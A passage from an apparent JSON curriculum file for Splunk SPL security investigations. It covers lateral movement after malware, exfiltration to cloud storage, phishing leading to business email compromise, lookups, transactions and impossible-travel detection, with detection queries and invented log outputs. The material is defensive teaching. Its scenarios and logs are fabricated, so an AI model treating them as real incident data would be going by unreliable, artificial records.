          "incident-response"
        ],
        "description": "Hunt for lateral movement after a compromised workstation is discovered.",
        "content": {
          "situation": "Endpoint protection flagged malware on workstation WKS-HR-022 (10.10.50.22). The malware included credential harvesting capabilities. You need to determine if the attacker moved laterally to other systems.",
          "steps": [
            {
              "question": "First, identify who was logged into the compromised workstation when the malware was active.",
              "hint": "Look for logon events (4624) on the compromised system.",
              "spl": "index=wineventlog EventCode=4624 host=\"WKS-HR-022\" earliest=-24h | stats values(TargetUserName) as users, count by LogonType | sort -count",
              "analysis": "Shows all users who logged into the compromised workstation.",
              "output": {
                "columns": [
                  "LogonType",
                  "users",
                  "count"
                ],
                "rows": [
                  {
                    "LogonType": "2",
                    "users": "jmorgan, admin_jmorgan",
                    "count": "50"
                  },
                  {
                    "LogonType": "5",
                    "users": "svc_backup",
                    "count": "12"
                  },
                  {
                    "LogonType": "3",
                    "users": "SYSTEM",
                    "count": "8"
                  }
                ]
              },
              "finding": "Three users logged in: jmorgan (interactive, 47 times), svc_backup (service, 12 times), and admin_jmorgan (interactive, 3 times). The admin account is concerning."
            },
            {
              "question": "Those credentials may be compromised. Where else have these accounts authenticated FROM the compromised machine?",
              "hint": "Look for network logon events (Type 3) where the source is the compromised workstation.",
              "spl": "index=wineventlog EventCode=4624 LogonType=3 IpAddress=\"10.10.50.22\" | stats count, dc(host) as systems by TargetUserName | sort -systems",
              "analysis": "Shows accounts used to authenticate TO other systems FROM the compromised workstation.",
              "output": {
                "columns": [
                  "TargetUserName",
                  "systems",
                  "count"
                ],
                "rows": [
                  {
                    "TargetUserName": "admin_jmorgan",
                    "systems": "14",
                    "count": "87"
                  },
                  {
                    "TargetUserName": "jmorgan",
                    "systems": "2",
                    "count": "5"
                  },
                  {
                    "TargetUserName": "svc_backup",
                    "systems": "1",
                    "count": "12"
                  }
                ]
              },
              "finding": "admin_jmorgan connected to 14 different systems from the compromised machine. This is highly unusual for a 24-hour period."
            },
            {
              "question": "Map the admin_jmorgan lateral movement. What systems did they access?",
              "hint": "Track the authentication events for admin_jmorgan from the compromised source.",
              "spl": "index=wineventlog EventCode=4624 LogonType=3 IpAddress=\"10.10.50.22\" TargetUserName=\"admin_jmorgan\" | stats earliest(_time) as first, latest(_time) as last, count by host | sort first | table host, first, last, count",
              "analysis": "Creates a timeline of lateral movement.",
              "output": {
                "columns": [
                  "host",
                  "first",
                  "last",
                  "count"
                ],
                "rows": [
                  {
                    "host": "FILESRV-01",
                    "first": "2024-01-15 02:15:33",
                    "last": "2024-01-15 02:18:47",
                    "count": "3"
                  },
                  {
                    "host": "DC-CORP-01",
                    "first": "2024-01-15 02:22:15",
                    "last": "2024-01-15 03:47:22",
                    "count": "24"
                  },
                  {
                    "host": "SQLDB-PROD-01",
                    "first": "2024-01-15 03:12:08",
                    "last": "2024-01-15 03:45:19",
                    "count": "18"
                  },
                  {
                    "host": "BACKUP-01",
                    "first": "2024-01-15 03:48:55",
                    "last": "2024-01-15 04:02:33",
                    "count": "7"
                  }
                ]
              },
              "finding": "Movement chain identified: WKS-HR-022  FILESRV-01  DC-CORP-01  SQLDB-PROD-01  BACKUP-01. Attacker accessed domain controller and production database!"
            },
            {
              "question": "Critical: Did the attacker access the domain controller? What actions were taken there?",
              "hint": "Look for privileged actions on the DC from the compromised credentials.",
              "spl": "index=wineventlog host=\"DC-CORP-01\" TargetUserName=\"admin_jmorgan\" earliest=-24h | stats count by EventCode | lookup wineventcode_lookup EventCode OUTPUT EventDescription | sort -count",
              "analysis": "Shows what events the compromised account generated on the domain controller.",
              "output": {
                "columns": [
                  "EventCode",
                  "EventDescription",
                  "count"
                ],
                "rows": [
                  {
                    "EventCode": "4624",
                    "EventDescription": "Successful logon",
                    "count": "24"
                  },
                  {
                    "EventCode": "4672",
                    "EventDescription": "Special privileges assigned",
                    "count": "24"
                  },
                  {
                    "EventCode": "4728",
                    "EventDescription": "Member added to security-enabled global group",
                    "count": "1"
                  },
                  {
                    "EventCode": "4720",
                    "EventDescription": "User account was created",
                    "count": "1"
                  },
                  {
                    "EventCode": "4738",
                    "EventDescription": "User account was changed",
                    "count": "1"
                  }
                ]
              },
              "finding": "CRITICAL: EventCode 4728 (member added to security group) and 4738 (user account changed) detected. Attacker may have created persistence!"
            },
            {
              "question": "Identify any new accounts or group membership changes made by the attacker.",
              "hint": "Look at account creation and group modification events.",
              "spl": "index=wineventlog host=\"DC-CORP-01\" EventCode IN (4720, 4728, 4732) earliest=-24h | table _time, EventCode, TargetUserName, SubjectUserName, GroupName | sort _time",
              "analysis": "Shows account creation and group membership changes.",
              "output": {
                "columns": [
                  "_time",
                  "EventCode",
                  "TargetUserName",
                  "SubjectUserName",
                  "GroupName"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 03:47:01",
                    "EventCode": "4720",
                    "TargetUserName": "support_temp",
                    "SubjectUserName": "admin_jmorgan",
                    "GroupName": "-"
                  },
                  {
                    "_time": "2024-01-15 03:47:15",
                    "EventCode": "4728",
                    "TargetUserName": "support_temp",
                    "SubjectUserName": "admin_jmorgan",
                    "GroupName": "Domain Admins"
                  }
                ]
              },
              "finding": "Attacker created account \"support_temp\" and added it to \"Domain Admins\" group at 03:47 AM. This is a backdoor account!"
            }
          ],
          "conclusion": "<strong>Investigation Complete - CRITICAL INCIDENT</strong><br><br>\n                    <strong>Confirmed Lateral Movement Path:</strong><br>\n                    WKS-HR-022  FILESRV-01  DC-CORP-01  SQLDB-PROD-01  BACKUP-01<br><br>\n                    <strong>Credentials Compromised:</strong> jmorgan, admin_jmorgan<br><br>\n                    <strong>Persistence Established:</strong> Backdoor account \"support_temp\" added to Domain Admins<br><br>\n                    <strong>IMMEDIATE ACTIONS:</strong>\n                    <ol>\n                        <li>Disable \"support_temp\" and \"admin_jmorgan\" accounts immediately</li>\n                        <li>Force password reset for \"jmorgan\"</li>\n                        <li>Isolate compromised workstation WKS-HR-022</li>\n                        <li>Scan all accessed systems for malware/backdoors</li>\n                        <li>Engage IR team - domain controller compromise requires full investigation</li>\n                        <li>Check SQLDB-PROD-01 for data access/exfiltration</li>\n                    </ol>"
        }
      },
      {
        "id": "int-003",
        "title": "Data Exfiltration Analysis",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Identify abnormal data transfers",
          "Calculate baseline deviations",
          "Correlate network and endpoint data"
        ],
        "tags": [
          "network",
          "exfiltration",
          "dlp"
        ],
        "description": "Investigate suspected data exfiltration through unusual outbound transfers.",
        "content": {
          "situation": "DLP system flagged \"possible data exfiltration\" for user account \"mchen\" but has limited details. Your firewall and proxy logs should reveal if sensitive data left the network.",
          "steps": [
            {
              "question": "First, understand mchen's normal data transfer patterns. What's their baseline?",
              "hint": "Calculate average daily outbound bytes for this user over the past 30 days.",
              "spl": "index=proxy user=\"mchen\" earliest=-30d latest=-1d | bin _time span=1d | stats sum(bytes_out) as daily_bytes by _time | stats avg(daily_bytes) as avg_daily, stdev(daily_bytes) as stdev_daily, max(daily_bytes) as max_daily",
              "analysis": "Establish baseline transfer patterns.",
              "output": {
                "columns": [
                  "avg_daily",
                  "stdev_daily",
                  "max_daily"
                ],
                "rows": [
                  {
                    "avg_daily": "157286400",
                    "stdev_daily": "47185920",
                    "max_daily": "293601280"
                  }
                ],
                "note": "(avg: ~150MB, stdev: ~45MB, max: ~280MB)"
              },
              "finding": "Baseline: Average 150MB/day, std dev 45MB, max 280MB. Anything significantly above 300MB would be anomalous."
            },
            {
              "question": "Now check today's activity. How does it compare to baseline?",
              "hint": "Sum today's outbound bytes and compare to the baseline we just established.",
              "spl": "index=proxy user=\"mchen\" earliest=@d | stats sum(bytes_out) as today_bytes | eval today_MB=round(today_bytes/1024/1024, 2) | eval baseline_avg_MB=150, anomaly_threshold_MB=300 | eval status=if(today_MB>anomaly_threshold_MB, \"ANOMALOUS\", \"NORMAL\")",
              "analysis": "Compare today to baseline.",
              "output": {
                "columns": [
                  "today_bytes",
                  "today_MB",
                  "baseline_avg_MB",
                  "anomaly_threshold_MB",
                  "status"
                ],
                "rows": [
                  {
                    "today_bytes": "2469606195",
                    "today_MB": "2355.20",
                    "baseline_avg_MB": "150",
                    "anomaly_threshold_MB": "300",
                    "status": "ANOMALOUS"
                  }
                ]
              },
              "finding": "ANOMALOUS: User mchen has transferred 2.3GB today - 15x their normal average!"
            },
            {
              "question": "Where is this data going? Identify the top destinations.",
              "hint": "Group outbound traffic by destination domain or IP.",
              "spl": "index=proxy user=\"mchen\" earliest=@d | stats sum(bytes_out) as bytes by dest_domain | sort -bytes | eval MB=round(bytes/1024/1024, 2) | head 10",
              "analysis": "Identify where data is being sent.",
              "output": {
                "columns": [
                  "dest_domain",
                  "bytes",
                  "MB"
                ],
                "rows": [
                  {
                    "dest_domain": "mega.nz",
                    "bytes": "2202009600",
                    "MB": "2100.00"
                  },
                  {
                    "dest_domain": "drive.google.com",
                    "bytes": "125829120",
                    "MB": "120.00"
                  },
                  {
                    "dest_domain": "pastebin.com",
                    "bytes": "47185920",
                    "MB": "45.00"
                  },
                  {
                    "dest_domain": "outlook.office365.com",
                    "bytes": "52428800",
                    "MB": "50.00"
                  }
                ],
                "truncated": "Showing 4 of 10 results"
              },
              "finding": "Top destination: mega.nz (cloud storage) with 2.1GB. Also: drive.google.com (120MB), pastebin.com (45MB). These are file-sharing services!"
            },
            {
              "question": "What files or content type is being uploaded to these services?",
              "hint": "Look at content types, file extensions, or request patterns in proxy logs.",
              "spl": "index=proxy user=\"mchen\" dest_domain IN (\"mega.nz\", \"drive.google.com\") action=upload | stats count, sum(bytes_out) as bytes by content_type, filename | sort -bytes",
              "analysis": "Identify what types of files are being exfiltrated.",
              "output": {
                "columns": [
                  "content_type",
                  "filename",
                  "count",
                  "bytes"
                ],
                "rows": [
                  {
                    "content_type": "application/zip",
                    "filename": "Customer_Database_Export.zip",
                    "count": "1",
                    "bytes": "1258291200"
                  },
                  {
                    "content_type": "application/vnd.ms-excel",
                    "filename": "Q4_Financial_Report.xlsx",
                    "count": "1",
                    "bytes": "524288000"
                  },
                  {
                    "content_type": "application/vnd.ms-powerpoint",
                    "filename": "Strategy_2024.pptx",
                    "count": "1",
                    "bytes": "314572800"
                  },
                  {
                    "content_type": "application/pdf",
                    "filename": "Employee_Directory.pdf",
                    "count": "1",
                    "bytes": "104857600"
                  }
                ]
              },
              "finding": "Uploaded files include: \"Q4_Financial_Report.xlsx\", \"Customer_Database_Export.zip\", \"Strategy_2024.pptx\". These are clearly sensitive documents!"
            },
            {
              "question": "Timeline the exfiltration. When did it happen and was it during work hours?",
              "hint": "Create a timeline of the suspicious uploads.",
              "spl": "index=proxy user=\"mchen\" dest_domain=\"mega.nz\" action=upload | timechart span=1h sum(bytes_out) as bytes_uploaded | eval MB=round(bytes_uploaded/1024/1024, 2)",
              "analysis": "Shows when the uploads occurred.",
              "output": {
                "columns": [
                  "_time",
                  "bytes_uploaded",
                  "MB"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 23:00",
                    "bytes_uploaded": "524288000",
                    "MB": "500.00"
                  },
                  {
                    "_time": "2024-01-16 00:00",
                    "bytes_uploaded": "838860800",
                    "MB": "800.00"
                  },
                  {
                    "_time": "2024-01-16 01:00",
                    "bytes_uploaded": "629145600",
                    "MB": "600.00"
                  },
                  {
                    "_time": "2024-01-16 02:00",
                    "bytes_uploaded": "209715200",
                    "MB": "200.00"
                  }
                ]
              },
              "finding": "Bulk uploads occurred between 11 PM and 2 AM - outside business hours. User may have tried to avoid detection."
            }
          ],
          "conclusion": "<strong>Investigation Complete - CONFIRMED EXFILTRATION</strong><br><br>\n                    <strong>Volume:</strong> 2.3GB transferred to personal cloud storage (mega.nz)<br><br>\n                    <strong>Sensitive Files Identified:</strong>\n                    <ul>\n                        <li>Q4_Financial_Report.xlsx</li>\n                        <li>Customer_Database_Export.zip</li>\n                        <li>Strategy_2024.pptx</li>\n                    </ul><br>\n                    <strong>Timing:</strong> 11 PM - 2 AM (outside business hours)<br><br>\n                    <strong>Recommended Actions:</strong>\n                    <ol>\n                        <li>Preserve all evidence (proxy logs, endpoint forensics)</li>\n                        <li>Engage HR and Legal immediately - this is a policy violation</li>\n                        <li>Suspend mchen's network access pending investigation</li>\n                        <li>Block mega.nz at proxy level</li>\n                        <li>Determine if mchen gave notice or has reason for data collection</li>\n                        <li>Prepare for potential law enforcement involvement</li>\n                    </ol>"
        }
      },
      {
        "id": "int-004",
        "title": "Lookup Enrichment",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "15 min",
        "objectives": [
          "Use lookup tables to add context",
          "Enrich security events with asset data",
          "Handle lookup mismatches"
        ],
        "tags": [
          "lookups",
          "enrichment",
          "context"
        ],
        "description": "Add business context to security events using lookup tables.",
        "content": {
          "problem": "Enrich firewall events with asset information. For each source IP, add the hostname, department, and owner from the asset_inventory lookup. Flag any IPs that are NOT in the asset inventory as \"Unknown Asset\".",
          "hints": [
            "Use the lookup command to enrich events",
            "Use OUTPUT to specify which fields to add",
            "Use eval with if/isnull to handle missing lookups"
          ],
          "solution": {
            "spl": "index=firewall | lookup asset_inventory ip as src_ip OUTPUT hostname, department, owner | eval hostname=if(isnull(hostname), \"Unknown Asset\", hostname) | eval department=if(isnull(department), \"INVESTIGATE\", department) | stats count by src_ip, hostname, department, owner | sort -count",
            "explanation": "The lookup command matches src_ip to the ip field in asset_inventory and adds hostname, department, and owner. We then use eval with isnull() to flag unknown assets that need investigation."
          },
          "variations": [
            {
              "description": "Enrich with threat intelligence and flag malicious IPs:",
              "spl": "index=firewall | lookup threat_intel_ip ip as dest_ip OUTPUT threat_type, severity | where isnotnull(threat_type) | stats count by dest_ip, threat_type, severity"
            },
            {
              "description": "Add GeoIP data and find connections to unusual countries:",
              "spl": "index=firewall | iplocation dest_ip | stats count, sum(bytes_out) as bytes by dest_country | sort -bytes"
            }
          ]
        }
      },
      {
        "id": "int-005",
        "title": "Transaction Building",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Group related events into transactions",
          "Calculate session duration",
          "Identify incomplete transactions"
        ],
        "tags": [
          "transaction",
          "sessions",
          "correlation"
        ],
        "description": "Learn to group related events together using the transaction command.",
        "content": {
          "problem": "Build VPN sessions from individual events. Group events by username, where a session starts with action=\"connect\" and ends with action=\"disconnect\". Calculate session duration and find any sessions longer than 8 hours.",
          "hints": [
            "Transaction groups events with common field values",
            "startswith and endswith define session boundaries",
            "Transaction automatically calculates duration"
          ],
          "solution": {
            "spl": "index=vpn | transaction user startswith=(action=\"connect\") endswith=(action=\"disconnect\") | where duration > 28800 | eval hours=round(duration/3600, 2) | table user, duration, hours, eventcount, _time",
            "explanation": "Transaction groups VPN events by user, creating sessions that start with connect and end with disconnect. The duration field (in seconds) is automatically calculated. We filter to sessions over 8 hours (28800 seconds) which may indicate forgotten sessions or policy violations."
          },
          "variations": [
            {
              "description": "Find web sessions with more than 100 page views:",
              "spl": "index=web | transaction session_id maxspan=30m | where eventcount > 100 | stats count by user, eventcount, duration"
            },
            {
              "description": "Find incomplete VPN sessions (no disconnect):",
              "spl": "index=vpn | transaction user startswith=(action=\"connect\") endswith=(action=\"disconnect\") maxspan=12h | where NOT closed_txn | table user, _time, eventcount"
            }
          ]
        }
      },
      {
        "id": "int-006",
        "title": "Correlating Data Sources",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Choose the right correlation technique",
          "Combine data from multiple indexes",
          "Enrich events with context from other sources"
        ],
        "tags": [
          "correlation",
          "join",
          "append",
          "lookup",
          "enrichment"
        ],
        "description": "Learn to combine data from different sources - a critical skill for security investigations.",
        "content": {
          "sections": [
            {
              "title": "Why Correlate?",
              "body": "<p>Real investigations require data from multiple sources:</p>\n                        <ul>\n                            <li>Auth logs + Endpoint logs = Who did what on which machine</li>\n                            <li>Firewall + Proxy = Complete picture of network activity</li>\n                            <li>Events + Asset inventory = Business context</li>\n                        </ul>\n                        <p>SPL offers several ways to combine data. Choosing the right one matters for both correctness and performance.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Method 1: Subsearch (for filtering)",
              "body": "<p>Use subsearch when you want to <strong>filter</strong> one dataset based on another:</p>\n                        <p><em>\"Show me web activity from IPs that had failed logins\"</em></p>",
              "spl": "index=web [search index=auth action=failure | stats count by src_ip | where count > 10 | fields src_ip]\n| stats count by src_ip, uri_path",
              "explanation": "Subsearch finds IPs with >10 failed logins, main search filters web logs to those IPs. Fast, but limited to ~10K results from subsearch."
            },
            {
              "title": "Method 2: Join (for combining fields)",
              "body": "<p>Use join when you need to <strong>add fields</strong> from one dataset to another:</p>\n                        <p><em>\"Add user department to authentication events\"</em></p>",
              "spl": "index=auth action=failure\n| join type=left user [search index=hr_data | fields user, department, manager]\n| stats count by user, department",
              "explanation": "Left join keeps all auth events, adds department from HR data where user matches. Missing matches get null values."
            },
            {
              "title": "Method 3: Lookup (for enrichment)",
              "body": "<p>Use lookup for <strong>static reference data</strong> - it's faster than join:</p>\n                        <p><em>\"Add threat intel context to firewall events\"</em></p>",
              "spl": "index=firewall\n| lookup threat_intel.csv ip as dest_ip OUTPUT threat_type, severity, description\n| where isnotnull(threat_type)\n| stats count by dest_ip, threat_type, severity",
              "explanation": "Lookups are optimized for enrichment from CSV files. Much faster than joining to a search."
            },
            {
              "title": "Method 4: Append (for stacking)",
              "body": "<p>Use append when you want to <strong>combine rows</strong> from different searches:</p>\n                        <p><em>\"Show all login failures from both Windows and Linux\"</em></p>",
              "spl": "index=wineventlog EventCode=4625 | stats count by user, src_ip | eval source=\"windows\"\n| append [search index=linux_secure \"authentication failure\" | stats count by user, src_ip | eval source=\"linux\"]\n| stats sum(count) as total_failures by user, src_ip",
              "explanation": "Append stacks results vertically. Use when combining similar data from different indexes."
            },
            {
              "title": "Method 5: Union (for combining with normalization)",
              "body": "<p>Use union when datasets have <strong>different field names</strong>:</p>",
              "spl": "| union\n    [search index=proxy | fields _time, user, url as target, bytes]\n    [search index=firewall | fields _time, user, dest_ip as target, bytes_out as bytes]\n| stats sum(bytes) by user, target",
              "explanation": "Union is like append but better handles field name differences. Normalizes at query time."
            },
            {
              "title": "Decision Guide",
              "body": "<table style=\"width:100%; border-collapse: collapse; margin: 10px 0;\">\n                            <tr style=\"background: rgba(255,255,255,0.1);\"><td style=\"padding:8px; border:1px solid #444;\"><strong>Need</strong></td><td style=\"padding:8px; border:1px solid #444;\"><strong>Use</strong></td><td style=\"padding:8px; border:1px solid #444;\"><strong>Performance</strong></td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Filter events by values from another search</td><td style=\"padding:8px; border:1px solid #444;\">Subsearch</td><td style=\"padding:8px; border:1px solid #444;\">Good (if <10K values)</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Add fields from static CSV file</td><td style=\"padding:8px; border:1px solid #444;\">Lookup</td><td style=\"padding:8px; border:1px solid #444;\">Excellent</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Add fields from another search</td><td style=\"padding:8px; border:1px solid #444;\">Join</td><td style=\"padding:8px; border:1px solid #444;\">Moderate (memory heavy)</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Stack rows from different sources</td><td style=\"padding:8px; border:1px solid #444;\">Append/Union</td><td style=\"padding:8px; border:1px solid #444;\">Good</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Compare datasets (what's in A not B)</td><td style=\"padding:8px; border:1px solid #444;\">set diff</td><td style=\"padding:8px; border:1px solid #444;\">Good</td></tr>\n                        </table>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "int-007",
        "title": "Phishing Investigation",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "30 min",
        "objectives": [
          "Trace phishing email to endpoint activity",
          "Identify affected users and systems",
          "Determine scope of compromise"
        ],
        "tags": [
          "phishing",
          "email",
          "endpoint",
          "incident-response"
        ],
        "description": "Investigate a reported phishing email and determine if anyone clicked.",
        "content": {
          "situation": "A user reports a suspicious email with subject \"Urgent: Update Your Password\" containing a link to \"secure-login-update[.]com\". Security received the report 2 hours after the email was sent. You need to determine how many users received it, who clicked, and if any systems are compromised.",
          "steps": [
            {
              "question": "First, find all recipients of this phishing email in the mail logs.",
              "hint": "Search email logs for the subject line or sender domain.",
              "spl": "index=email subject=\"*Urgent*Update Your Password*\" OR sender_domain=\"*secure-login-update*\" | stats count by recipient, sender, subject, _time | sort _time",
              "analysis": "Identify all recipients to understand the scope of the campaign.",
              "output": {
                "columns": [
                  "recipient",
                  "sender",
                  "subject",
                  "_time"
                ],
                "rows": [
                  {
                    "recipient": "jsmith@company.com",
                    "sender": "it-support@secure-login-update.com",
                    "subject": "Urgent: Update Your Password",
                    "_time": "2024-01-15 09:15:22"
                  },
                  {
                    "recipient": "mwilson@company.com",
                    "sender": "it-support@secure-login-update.com",
                    "subject": "Urgent: Update Your Password",
                    "_time": "2024-01-15 09:15:24"
                  },
                  {
                    "recipient": "pjones@company.com",
                    "sender": "it-support@secure-login-update.com",
                    "subject": "Urgent: Update Your Password",
                    "_time": "2024-01-15 09:15:25"
                  },
                  {
                    "recipient": "rthompson@company.com",
                    "sender": "it-support@secure-login-update.com",
                    "subject": "Urgent: Update Your Password",
                    "_time": "2024-01-15 09:15:27"
                  },
                  {
                    "recipient": "admin@company.com",
                    "sender": "it-support@secure-login-update.com",
                    "subject": "Urgent: Update Your Password",
                    "_time": "2024-01-15 09:15:28"
                  }
                ],
                "truncated": "Showing 5 of 47 recipients"
              },
              "finding": "47 employees received the phishing email within a 2-minute window at 9:15 AM. This was a targeted campaign against the organization."
            },
            {
              "question": "Check proxy logs - did anyone click the malicious link?",
              "hint": "Look for the phishing domain in web proxy logs.",
              "spl": "index=proxy url=\"*secure-login-update*\" | stats count, values(url) as urls by user, src_ip, _time | sort _time",
              "analysis": "Proxy logs show who visited the malicious domain.",
              "output": {
                "columns": [
                  "user",
                  "src_ip",
                  "urls",
                  "_time",
                  "count"
                ],
                "rows": [
                  {
                    "user": "mwilson",
                    "src_ip": "10.10.25.44",
                    "urls": "https://secure-login-update.com/portal/login.php",
                    "_time": "2024-01-15 09:23:17",
                    "count": "3"
                  },
                  {
                    "user": "pjones",
                    "src_ip": "10.10.32.18",
                    "urls": "https://secure-login-update.com/portal/login.php",
                    "_time": "2024-01-15 09:45:08",
                    "count": "1"
                  }
                ]
              },
              "finding": "Two users clicked the link: mwilson (3 visits) and pjones (1 visit). mwilson accessed it 8 minutes after receiving the email."
            },
            {
              "question": "Did the users submit credentials? Look for POST requests or form submissions.",
              "hint": "Filter proxy logs for POST method or content submission to the phishing site.",
              "spl": "index=proxy url=\"*secure-login-update*\" http_method=POST | table _time, user, src_ip, url, bytes_out, content_type",
              "analysis": "POST requests with data submission indicate credential entry.",
              "output": {
                "columns": [
                  "_time",
                  "user",
                  "src_ip",
                  "url",
                  "bytes_out",
                  "content_type"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 09:24:02",
                    "user": "mwilson",
                    "src_ip": "10.10.25.44",
                    "url": "https://secure-login-update.com/portal/submit.php",
                    "bytes_out": "847",
                    "content_type": "application/x-www-form-urlencoded"
                  }
                ]
              },
              "finding": "CRITICAL: mwilson submitted data (847 bytes) to the phishing site. Credentials are likely compromised. pjones clicked but did not submit."
            },
            {
              "question": "Check for post-compromise activity. Did anyone authenticate using mwilson's credentials from an unusual location?",
              "hint": "Look for authentication events for the compromised user from IPs other than their workstation.",
              "spl": "index=auth user=\"mwilson\" action=success earliest=\"01/15/2024:09:24:00\" | where src_ip!=\"10.10.25.44\" | stats count by src_ip, app, action, _time",
              "analysis": "Look for successful logins from IPs other than the user's workstation.",
              "output": {
                "columns": [
                  "src_ip",
                  "app",
                  "action",
                  "_time",
                  "count"
                ],
                "rows": [
                  {
                    "src_ip": "185.220.101.54",
                    "app": "OWA",
                    "action": "success",
                    "_time": "2024-01-15 09:31:15",
                    "count": "1"
                  },
                  {
                    "src_ip": "185.220.101.54",
                    "app": "VPN",
                    "action": "success",
                    "_time": "2024-01-15 09:35:42",
                    "count": "1"
                  }
                ]
              },
              "finding": "CONFIRMED COMPROMISE: Within 7 minutes of credential theft, attacker logged into OWA and VPN from IP 185.220.101.54 (located in Netherlands based on GeoIP)."
            },
            {
              "question": "What did the attacker do after gaining access? Check email and file access.",
              "hint": "Look for email forwarding rules, sent emails, or file downloads from the compromised account.",
              "spl": "index=email (sender=\"mwilson@company.com\" OR mailbox_rule_created=*) earliest=\"01/15/2024:09:30:00\" | eval activity=coalesce(mailbox_rule_created, \"sent email\") | stats count by activity, recipient, subject | head 10",
              "analysis": "Check for data exfiltration or further phishing from compromised account.",
              "output": {
                "columns": [
                  "activity",
                  "recipient",
                  "subject",
                  "count"
                ],
                "rows": [
                  {
                    "activity": "forward-to: attacker@protonmail.com",
                    "recipient": "-",
                    "subject": "-",
                    "count": "1"
                  },
                  {
                    "activity": "sent email",
                    "recipient": "finance-team@company.com",
                    "subject": "Re: Q4 Wire Transfer",
                    "count": "1"
                  },
                  {
                    "activity": "sent email",
                    "recipient": "ceo@company.com",
                    "subject": "Urgent: Account Access Required",
                    "count": "1"
                  }
                ]
              },
              "finding": "Attacker created a forwarding rule to protonmail.com and sent targeted emails to finance team and CEO. This is Business Email Compromise (BEC) in progress!"
            }
          ],
          "conclusion": "<strong>Investigation Complete - Active Incident</strong><br><br>\n                    <strong>Timeline:</strong><br>\n                    <ul>\n                        <li>9:15 AM - Phishing email sent to 47 employees</li>\n                        <li>9:23 AM - mwilson clicks link</li>\n                        <li>9:24 AM - mwilson submits credentials</li>\n                        <li>9:31 AM - Attacker logs into OWA from Netherlands</li>\n                        <li>9:35 AM - Attacker accesses VPN</li>\n                        <li>9:40 AM - Email forwarding rule created, BEC emails sent</li>\n                    </ul><br>\n                    <strong>Immediate Actions Required:</strong>\n                    <ol>\n                        <li>Disable mwilson's account immediately</li>\n                        <li>Remove the malicious forwarding rule</li>\n                        <li>Alert finance team and CEO about fraudulent emails</li>\n                        <li>Block IP 185.220.101.54 and domain secure-login-update.com</li>\n                        <li>Force password reset for mwilson</li>\n                        <li>Review all emails sent from mwilson's account since 9:30 AM</li>\n                        <li>Check pjones workstation for any compromise (clicked but didn't submit)</li>\n                    </ol>"
        }
      },
      {
        "id": "int-008",
        "title": "Impossible Travel Detection",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Detect geographically impossible logins",
          "Calculate travel velocity",
          "Distinguish legitimate from suspicious patterns"
        ],
        "tags": [
          "authentication",
          "geo",
          "account-compromise",
          "travel"
        ],
        "description": "Find users authenticating from locations too far apart to travel between.",
        "content": {
          "situation": "Your organization has users worldwide, but you've been asked to detect \"impossible travel\" - when a user logs in from two geographic locations so far apart that physical travel between them in the time span would be impossible. This often indicates credential theft.",
          "steps": [
            {
              "question": "First, let's get authentication events with geolocation data and calculate time between consecutive logins per user.",
              "hint": "Use iplocation to get geo data, then streamstats to calculate time delta.",
              "spl": "index=auth action=success | iplocation src_ip | where isnotnull(Country) | sort user, _time | streamstats window=2 current=t earliest(_time) as prev_time, earliest(City) as prev_city, earliest(Country) as prev_country, earliest(lat) as prev_lat, earliest(lon) as prev_lon by user | where isnotnull(prev_time) AND prev_time != _time",
              "analysis": "Get consecutive logins per user with their geographic coordinates.",
              "output": {
                "columns": [
                  "_time",
                  "user",
                  "City",
                  "Country",
                  "prev_city",
                  "prev_country"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 14:23:17",
                    "user": "jsmith",
                    "City": "New York",
                    "Country": "United States",
                    "prev_city": "London",
                    "prev_country": "United Kingdom"
                  },
                  {
                    "_time": "2024-01-15 09:45:33",
                    "user": "mwilson",
                    "City": "Chicago",
                    "Country": "United States",
                    "prev_city": "Chicago",
                    "prev_country": "United States"
                  },
                  {
                    "_time": "2024-01-15 11:22:08",
                    "user": "pjones",
                    "City": "Tokyo",
                    "Country": "Japan",
                    "prev_city": "San Francisco",
                    "prev_country": "United States"
                  }
                ],
                "truncated": "Showing 3 of 1,247 login pairs"
              },
              "finding": "We now have consecutive logins per user with geographic info. Need to calculate distances and travel time."
            },
            {
              "question": "Calculate the distance between consecutive logins and the time elapsed. Flag physically impossible travel.",
              "hint": "Use the Haversine formula or a distance approximation. 500 mph is a reasonable max air travel speed.",
              "spl": "index=auth action=success | iplocation src_ip | where isnotnull(lat) | sort user, _time\n| streamstats window=2 current=t earliest(_time) as prev_time, earliest(lat) as prev_lat, earliest(lon) as prev_lon, earliest(City) as prev_city by user\n| where isnotnull(prev_time) AND prev_time != _time\n| eval time_hours = (_time - prev_time) / 3600\n| eval distance_km = 6371 * acos(cos(pi()/180 * lat) * cos(pi()/180 * prev_lat) * cos(pi()/180 * (lon - prev_lon)) + sin(pi()/180 * lat) * sin(pi()/180 * prev_lat))\n| eval required_speed_kmh = distance_km / time_hours\n| where required_speed_kmh > 800\n| table _time, user, prev_city, City, time_hours, distance_km, required_speed_kmh",
              "analysis": "Calculate required travel speed. Flag if >800 km/h (faster than commercial flight).",
              "output": {
                "columns": [
                  "_time",
                  "user",
                  "prev_city",
                  "City",
                  "time_hours",
                  "distance_km",
                  "required_speed_kmh"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 14:23:17",
                    "user": "jsmith",
                    "prev_city": "London",
                    "City": "New York",
                    "time_hours": "0.5",
                    "distance_km": "5570",
                    "required_speed_kmh": "11140"
                  },
                  {
                    "_time": "2024-01-15 11:22:08",
                    "user": "pjones",
                    "prev_city": "San Francisco",
                    "City": "Tokyo",
                    "time_hours": "2.3",
                    "distance_km": "8270",
                    "required_speed_kmh": "3596"
                  }
                ]
              },
